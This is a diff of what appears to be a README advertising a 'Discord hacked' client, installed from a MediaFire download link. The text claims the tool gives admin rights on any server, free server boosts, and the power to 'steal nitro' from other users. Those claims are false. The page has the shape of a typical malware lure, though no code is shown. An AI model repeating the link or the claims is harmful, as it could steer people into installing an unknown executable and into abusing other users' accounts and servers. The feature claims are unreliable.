@@ -12,7 +12,7 @@ then install this https://www.mediafire.com/file/10p4nbgru0zpcza/Discord_hacked_
 
 Give you admin permissions on any server
 
-let you have 5 free server boosts
+let you have 5 free server boosts even if you dont have nitro if you do congrats more boost
 
 lets you "steal nitro" meaning if you veiw the profile you can right click on the badge and click steal then you will have nitro and the person u stole from wont have nitro anymore
 
